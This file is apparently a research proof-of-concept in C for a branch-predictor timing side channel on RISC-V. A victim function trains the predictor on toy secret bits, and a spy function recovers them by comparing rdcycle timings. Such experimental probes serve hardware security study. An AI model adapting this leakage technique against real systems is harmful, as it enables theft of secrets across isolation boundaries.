// brad_v1_sweep.c
// BRAD-v1 sweepable probe. victim_f in .text.victim, spy_f in .text.spy
// Differential probe (measure spy(1) and spy(0) and pick faster).
// Compile and link with a custom linker script to set alignment of sections.

#include <stdio.h>
#include <stdint.h>

#define SECRET_LEN 5
#define ATTACK_ROUNDS 40      // how many attack rounds to average per index
#define TRAINING_REPS 16      // training strength
#define PROBE_SAMPLES 400     // samples per probe value (1 & 0)

volatile uint8_t sec[SECRET_LEN] = {1,0,0,1,0};
volatile uint8_t array1[1] = {1};

/* Slight asymmetry in branch bodies to produce a measurable delta */
__attribute__((noinline, aligned(64)))
void condBranch(uint8_t *addr) {
    if (*addr) {
        asm volatile("nop; nop; nop; nop");
    } else {
        asm volatile("addi t1, zero, 2; nop");
    }
}

/* Place victim and spy into named text sections so the linker script can position them */
__attribute__((noinline, aligned(64), section(".text.victim")))
void victim_f(unsigned idx) {
    condBranch((uint8_t*)&sec[idx]);
}

__attribute__((noinline, aligned(64), section(".text.spy")))
void spy_f(unsigned idx) {
    (void)idx;
    condBranch((uint8_t*)&array1[0]);
}

/* rdcycle read with fences for serialization */
static inline uint64_t rdcycle_serialized(void) {
    uint64_t v;
    asm volatile("fence iorw, iorw" ::: "memory");
    asm volatile("rdcycle %0" : "=r"(v));
    asm volatile("fence iorw, iorw" ::: "memory");
    return v;
}

/* measure spy for value v, probe_samples times, return total cycles */
static uint64_t measure_spy_total(uint8_t v, unsigned probe_samples) {
    uint64_t sum = 0;
    array1[0] = v;
    for (unsigned i = 0; i < probe_samples; ++i) {
        uint64_t t0 = rdcycle_serialized();
        spy_f(0);
        uint64_t t1 = rdcycle_serialized();
        sum += (t1 - t0);
    }
    return sum;
}

int main(void) {
    printf("BRAD-v1 sweep probe (ATTACK_ROUNDS=%d TRAINING_REPS=%d PROBE_SAMPLES=%d)\n",
           ATTACK_ROUNDS, TRAINING_REPS, PROBE_SAMPLES);
    printf("Secret: ");
    for (unsigned i=0;i<SECRET_LEN;i++) printf("%u ", sec[i]);
    printf("\n\n");

    for (unsigned idx = 0; idx < SECRET_LEN; ++idx) {
        unsigned recovered_count1 = 0;
        uint64_t accum_sum1 = 0;
        uint64_t accum_sum0 = 0;

        for (unsigned r = 0; r < ATTACK_ROUNDS; ++r) {
            /* Train predictor by calling victim_f TRAINING_REPS times (real secret) */
            for (unsigned t = 0; t < TRAINING_REPS; ++t) {
                victim_f(idx);
            }

            /* Differential probe: measure spy(1) then spy(0) */
            uint64_t sum1 = measure_spy_total(1, PROBE_SAMPLES);
            uint64_t sum0 = measure_spy_total(0, PROBE_SAMPLES);

            accum_sum1 += sum1;
            accum_sum0 += sum0;

            int rec = (sum1 < sum0) ? 1 : 0; // faster wins
            if (rec) recovered_count1++;
        }

        double mean1 = (double)accum_sum1 / (double)(ATTACK_ROUNDS * PROBE_SAMPLES);
        double mean0 = (double)accum_sum0 / (double)(ATTACK_ROUNDS * PROBE_SAMPLES);

        printf("Index %u: mean_probe(1)=%.3f cycles mean_probe(0)=%.3f cycles recovered_count1=%u/%u => recovered=%d (actual=%u)\n",
               idx, mean1, mean0, recovered_count1, ATTACK_ROUNDS, (recovered_count1 > (ATTACK_ROUNDS/2))?1:0, sec[idx]);
    }

    return 0;
}